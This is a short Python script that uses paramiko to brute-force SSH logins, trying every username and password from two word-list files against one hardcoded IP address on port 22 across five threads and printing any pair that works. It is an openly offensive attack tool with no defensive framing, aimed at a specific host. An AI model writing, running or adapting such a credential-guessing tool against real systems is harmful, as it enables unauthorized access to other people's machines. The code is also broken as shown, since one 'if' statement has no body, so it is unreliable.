import paramiko, sys, os, socket, threading, time
from datetime import datetime

t1=datetime.now()
print('Start time',t1)
usernames=[line.strip() for line in open('usernames.txt').readlines()]
passwords=[line.strip() for line in open('passwords.txt').readlines()]
ipAddress=['184.171.153.180']

def bruteforce(start,end,step):
    found=False
    for a in range(len(ipAddress)):
        for x in range(len(usernames)):
            for y in range(start,end,step):
                if found==True:
                ssh=paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    ssh.connect(ipAddress[a],port=22,username=usernames[x],password=passwords[y])
                    ssh.close()
                    print(ipAddress[0],usernames[x],passwords[y])
                    print(datetime.now())
                    found=True
                    break
                except:
                    pass
                ssh.close()
            if found==True:
                break

def makeThreads(numThreads,function,argument):
    try:
        for num in range(numThreads):
            threading.Thread(target=function, args=(num,argument,numThreads)).start()
    except KeyboardInterrupt:
        sys.exit()
        
def threads(numThreads,function,argument):
    activeThreads=threading.activeCount()
    makeThreads(numThreads,function,argument)
    while threading.activeCount()>activeThreads:
        pass

threads(5,bruteforce,len(passwords))
print('End time',datetime.now())
print('Length',datetime.now()-t1)
